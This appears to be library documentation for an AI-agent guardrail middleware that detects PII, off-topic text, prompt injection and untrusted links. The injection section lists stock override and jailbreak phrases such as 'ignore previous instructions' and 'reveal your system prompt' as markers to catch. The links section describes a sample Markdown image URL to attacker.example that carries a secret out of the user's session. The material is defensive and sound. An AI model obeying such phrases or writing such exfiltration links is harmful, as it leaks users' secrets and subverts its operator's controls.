---
title: "Guardrails"
description: ai.guardrail composes input/output/tool-arg content detectors (pii, topic, injection, moderation) onto an agent — allow/redact/block/flag verdicts with an onBlock escalation seam.
sidebar:
  order: 5
  label: "Guardrails"
---

`ai.guardrail(options)` is one composed `AgentMiddleware` that runs content detectors at three points of an agent's loop — the outbound **prompt**, the model's **output**, and the **arguments** of a tool call — and maps each detector's verdict onto the pipeline's throw / rewrite / record mechanics. It ships with four zero-dependency detectors (`pii`, `topic`, `injection`, `links`) and one optional moderation detector backed by a lazy `openai` peer.

## When to reach for it

- **PII hygiene** — redact SSNs / emails / cards out of model replies before they reach a user or a log.
- **Stay on topic** — block (or flag) replies that drift into a denied subject.
- **Prompt-injection defense** — reject jailbreak / override / exfiltration markers on the inbound prompt.
- **Tool-arg safety** — block a tool call whose arguments carry something they shouldn't.
- **Exfiltration through rendered replies** — strip image and link URLs to hosts you don't trust before a chat UI renders them.
- **Human review** — escalate a hard block to a review queue via `escalation.onBlock`.

It is agent middleware, so it composes with everything else (budget, semantic cache, [human approval](/v/latest/ai/reliability/human-in-the-loop/)). See [Attach middleware](/v/latest/ai/reliability/attach-middleware/).

## The three phases

| Phase    | Hook          | Inspects                   | Supported verdicts                                  |
| -------- | ------------- | -------------------------- | --------------------------------------------------- |
| `input`  | `trip.before` | the outbound user prompt   | `allow` / `block` / `flag` (**`redact` → `block`**) |
| `output` | `trip.after`  | `response.content`         | `allow` / `redact` / `block` / `flag` (full)        |
| `tool`   | `tool.before` | `JSON.stringify(toolArgs)` | `allow` / `block` / `flag` (**`redact` → `block`**) |

Each phase is an **array of detectors run in registration order**; the first non-`allow`/non-`flag` verdict short-circuits that phase.

## `ai.guardrail(options)`

```ts
import { ai } from "@warlock.js/ai";

const policy = ai.guardrail({
  name: "compliance", // default "guardrail"
  input: [ai.guardrail.injection({ onMatch: "block" })],
  output: [ai.guardrail.pii({ onMatch: "redact", mask: "[REDACTED:{label}]" })],
  tool: [ai.guardrail.pii({ onMatch: "block" })],
  toolNames: ["send_email"], // scope the tool detectors
  escalation: {
    async onBlock(event) {
      await reviewQueue.enqueue(event);
    },
  },
});

const agent = ai.agent({ model, tools: [sendEmail], middleware: [policy] });
```

### Options

```ts
interface GuardOptions {
  name?: string; // surfaces on the error + the ctx.state namespace
  input?: readonly GuardrailDetector[]; // run at trip.before over the prompt
  output?: readonly GuardrailDetector[]; // run at trip.after over response.content
  tool?: readonly GuardrailDetector[]; // run at tool.before over JSON.stringify(args)
  toolNames?: string | readonly string[]; // restrict the tool detectors to these tools
  escalation?: GuardrailEscalation; // onBlock hook for escalate:true verdicts
  stream?: "buffered" | "unguarded"; // how a streaming run meets the output detectors; default "buffered"
}
```

`toolNames` scopes only the `tool` hooks (via the core `forTool` helper); `input` / `output` detectors still fire on every trip regardless. A guard with no detectors is a harmless no-op.

`input` detectors run once per distinct user text per run: the prompt does not change between the trips of a tool-using run, so a later trip whose text already passed skips them (and any paid moderation call). A detector that faulted runs again on the next trip.

## Streaming

`output` detectors inspect the model's whole reply in `trip.after`, but a streaming run (`agent.stream()`, [`ai.serve`](/v/latest/ai/agents/serve-over-sse/)) would otherwise send text to the consumer as it arrives, before they run. With `output` detectors set, the guard therefore holds each trip's text until they approve it, then streams the approved text as one `agent.trip.streaming` delta:

- a `redact` verdict streams the redacted text, never the original;
- a `block` verdict streams no text for that trip, and the run ends with the `GuardrailViolationError`;
- reasoning deltas (`agent.trip.reasoning`), which no detector inspects, are not streamed.

The cost is latency: the consumer sees each trip's text when the trip completes rather than token by token. Agents without `output` detectors stream exactly as before.

To stream token by token anyway, accepting that redaction and blocking then only change `result.text` and `result.error`, opt out:

```ts
ai.guardrail({ output: [ai.guardrail.pii()], stream: "unguarded" });
```

The plain `guardrail({ outputCheck })` middleware follows the same rule and takes the same `stream` option. A custom middleware that checks or rewrites the response in `trip.after` can opt into the same hold by setting `trip.bufferStream: true`.

## Verdicts — `allow` / `redact` / `block` / `flag`

Every detector's `check()` returns one `GuardrailVerdict`:

- **`allow`** — clean; continue to the next detector.
- **`redact`** — the detector returns rewritten `text`; the phase substitutes it (output only — see the degrade rule below).
- **`block`** — reject the trip / tool call. The guard throws a `GuardrailViolationError` onto `result.error`.
- **`flag`** — allow the content but record the match into `ctx.state` under `<name>.flags` for a downstream observer (panoptic, your code). The fold continues.

```ts
type GuardrailVerdict =
  | { type: "allow" }
  | { type: "redact"; text: string; reason: string; matches: readonly GuardrailMatch[] }
  | { type: "block"; reason: string; matches?: readonly GuardrailMatch[]; escalate?: boolean }
  | { type: "flag"; reason: string; matches: readonly GuardrailMatch[] };
```

### Input redaction degrades to block

The core `trip.before` seam can only **short-circuit or throw** — it has no rewrite-and-continue path. So a `redact` verdict on the **input** phase is downgraded to a `block` rather than silently passing the un-redacted prompt through. The same applies to the **tool** phase (`tool-arg-redaction-unsupported`): silently rewriting tool arguments would change the call's side-effects unpredictably, so a tool `redact` becomes a `block`. Only the **output** phase honours `redact` (it can return a replacement `ModelResponse`).

Practically: use `redact` for output PII; use `block` / `flag` for input and tool detectors.

### Fail-open on detector fault

A detector's `check()` _throwing_ is an infrastructure fault (e.g. a moderation API outage), not a content violation. The guard records it as a `flag` (`<detector>.error`) and continues — one detector's outage never aborts every agent run.

## Built-in detectors

All five attach as methods on `ai.guardrail`, so the whole vocabulary lives under one name. All but `moderation` are zero-runtime-dependency (pure string / regex).

### `ai.guardrail.pii(options?)`

Scans for personally identifiable information via curated linear regexes (safe against catastrophic backtracking) plus an optional exact-string dictionary.

```ts
ai.guardrail.pii({
  detect: ["ssn", "credit-card"], // default: all categories
  onMatch: "redact", // default "redact"
  mask: "[PII:{label}]", // {label} → the matched category; default "[REDACTED]"
  dictionary: ["Project Aurora"], // extra exact terms, matched case-insensitively
});
```

Categories: `ssn`, `email`, `phone`, `credit-card`, `ipv4`. `onMatch` is one of `redact` (default) / `block` / `flag`. Overlapping spans are deduped (earliest, widest kept) so a span is never masked twice. Scanning, deduping and redaction are linear in the length of the text, so a large crafted input (a long run of `a.a.a…`, thousands of address-shaped hits) cannot stall the server.

### `ai.guardrail.topic(options)`

Gates text against a deny list, an allow list, or both. A `string` matches case-insensitively as a substring; a `RegExp` is tested as-is.

```ts
// Block denied subjects:
ai.guardrail.topic({ deny: ["medical advice", /diagnos\w+/i] });

// Stay on-topic: anything matching NONE of the allow terms is flagged:
ai.guardrail.topic({ allow: ["billing", "invoice", "refund"], onMatch: "flag" });
```

The deny list is checked first; the first hit decides. `onMatch` is `block` (default) or `flag` — topic never redacts (it can't meaningfully rewrite a whole-text policy miss). `reason` overrides the verdict message.

### `ai.guardrail.injection(options?)`

Matches a curated set of jailbreak / prompt-injection marker phrases — override (`"ignore previous instructions"`), role-reset (`"you are now"`), jailbreak (`"developer mode"`, `"do anything now"`), exfiltration (`"reveal your system prompt"`) — extensible with caller `markers`.

```ts
const guard = ai.guardrail({
  input: [ai.guardrail.injection({ onMatch: "block" })], // reject on the inbound prompt
  output: [ai.guardrail.injection()], // flag-only on the model's reply
});

// Extend the built-in set with a house rule:
ai.guardrail.injection({ markers: [/system\s*:\s*override/i, "sudo mode"] });
```

`onMatch` defaults to `"flag"` — callers commonly escalate to `"block"` on the `input` phase. Phrases are deliberately specific so ordinary prose does not trip the rule.

Phrases match on normalized text, so trivial obfuscation does not hide them: case, full-width and other compatibility forms (NFKC), invisible characters such as zero-width spaces, and runs of whitespace, `_`, `-` or `.` are folded. `"Ignore  previous\ninstructions"` and `"ignore_previous-instructions"` both match. Caller `string` markers are normalized the same way. Caller `RegExp` markers run on the original text, as a copy without their `g` / `y` flags, so a global pattern matches on every check. The detector is a heuristic: it sees the user prompt, the reply and tool arguments, not tool results or retrieved documents, so check that content where it enters (inside the tool, or in a custom `tool.after` middleware).

### `ai.guardrail.links(options?)`

An `output` detector for chat UIs that render the reply as Markdown or HTML. Instructions injected through a document, web page or tool result can make the model write `![](https://attacker.example/?q=<secret>)`; when the UI renders the reply, the browser loads that image and sends the secret, without any click. `links` finds image URLs whose host is not on `allowHosts` and strips them:

```ts
ai.guardrail({
  output: [
    ai.guardrail.links({
      allowHosts: ["cdn.example.com", "*.example.org"], // default: none
      links: true, // also strip links; default false (images only)
      onMatch: "redact", // default; or "block" / "flag"
    }),
  ],
});
```

| Checked                                                                                                       | When               |
| ------------------------------------------------------------------------------------------------------------- | ------------------ |
| Markdown images `![alt](url)`, reference definitions `[ref]: url`, `<img src / srcset>`, `<image src / href>` | always             |
| Markdown links `[text](url)`, `<a href>`, autolinks `<https://…>`                                             | with `links: true` |

- **Allowed URLs:** relative URLs (`/img/a.png`, `#top`) always; absolute URLs only when `http(s)` and the host is listed. `"*.example.org"` matches subdomains of `example.org` (list `example.org` too for the apex). Other schemes (`data:`, `javascript:`, `mailto:`) and URLs with entity references (`&`) or backslashes before the query are refused, because a renderer may decode them into a different host.
- **`redact`** keeps the visible text: an image becomes its alt text, a link its link text, a refused reference definition is removed. Nested constructs (an image inside a link) are handled in the same rewrite.
- Matching is linear in the length of the reply, and with output detectors set a streamed reply is held until they run (see [Streaming](#streaming)), so the URL never reaches the client.

It is not an HTML sanitizer: it does not look at other tags (`<iframe>`, `<video poster>`, CSS `url()`), and bare URLs that a renderer turns into links are not changed. If the UI renders HTML from the model at all, pass the reply through an HTML sanitizer too.

### `ai.guardrail.moderation(options?)` — optional `openai` peer

Sends the inspected text to OpenAI's moderation endpoint and maps flagged categories to a verdict: any category in `blockOn` → `block`; any other flagged category → `flag`; nothing flagged → `allow`.

```ts
ai.guardrail.moderation({
  blockOn: ["violence", "sexual/minors"], // omit to flag on any category
  model: "omni-moderation-latest", // default
  apiKey: process.env.OPENAI_API_KEY, // reads OPENAI_API_KEY when omitted
});

// Bring your own client (or a test double) — the SDK is then never imported:
ai.guardrail.moderation({ client: openAiClient });
```

The `openai` SDK is an **optional peer**, resolved lazily on the first `check()` — importing `@warlock.js/ai` never forces it to install. When it's absent and no `client` was supplied, a curated install string surfaces on the first call. Because `check()` is async, the moderation detector adds a network round-trip per inspected text — reserve it for the phases that need it.

### Custom detectors

A detector is just `{ name, check(text, ctx) }`:

```ts
const noShouting = {
  name: "no-shouting",
  check(text) {
    return text === text.toUpperCase() && text.length > 0
      ? { type: "flag", reason: "all caps", matches: [{ rule: "no-shouting" }] }
      : { type: "allow" };
  },
};

ai.guardrail({ output: [noShouting] });
```

`check` receives a read-only `GuardrailDetectorContext` (`phase` plus the live trip `ctx`) and may be sync or async. A detector must never mutate `ctx` — the factory owns all pipeline effects.

## Blocks, errors, and escalation

A `block` verdict throws a `GuardrailViolationError` onto `result.error` — like every `AIError`, it never escapes `execute()`:

```ts
import { GuardrailViolationError } from "@warlock.js/ai";

const result = await agent.execute(userText);

if (result.error instanceof GuardrailViolationError) {
  // result.error.phase    — "input" | "output" (widened with "tool" at runtime)
  // result.error.reason    — the detector's reason
  // result.error.guardrail — the guard's `name`
}
```

### `escalation.onBlock` — hand a block to a human

A detector can return `{ type: "block", escalate: true }`. When it does, the guard **awaits** `escalation.onBlock(event)` _before_ throwing — the seam for routing a hard block to a human-review surface:

```ts
ai.guardrail({
  output: [ai.guardrail.topic({ deny: ["legal advice"] /* a detector may set escalate */ })],
  escalation: {
    async onBlock(event) {
      // event: { phase, reason, matches?, ctx }
      await reviewQueue.enqueue({ phase: event.phase, reason: event.reason });
    },
  },
});
```

`onBlock` is a plain callback by design — the guard takes no dependency on the human-step machinery. To turn a guard block into a true pause-and-resume, wire your own review queue here and pair it with [`ai.human.resume`](/v/latest/ai/reliability/human-in-the-loop/). The callback fires **only** for `escalate: true` verdicts.

## Reading `flag` annotations

`flag` verdicts don't stop the run — they accumulate into `ctx.state` under `<name>.flags` as an append-only `FlagRecord[]`:

```ts
interface FlagRecord {
  detector: string; // which detector flagged
  phase: GuardrailPhase; // "input" | "output" | "tool"
  reason: string;
  matches: readonly GuardrailMatch[];
}
```

This is how you run a guard in **observe-only** mode — set every detector to `onMatch: "flag"`, let runs complete, and inspect the recorded flags to tune thresholds before flipping any detector to `block`.

## Related

- [Attach middleware](/v/latest/ai/reliability/attach-middleware/) — how the guard composes with budget, cache, approval; ordering invariants.
- [Human in the loop](/v/latest/ai/reliability/human-in-the-loop/) — pair `escalation.onBlock` with `ai.human.resume` for a true human gate.
- [Run agent](/v/latest/ai/agents/run-agent/) — the agent the guard wraps; `result.error` handling.
- [Define tools](/v/latest/ai/tools/define-tools/) — the tools `tool` detectors inspect.
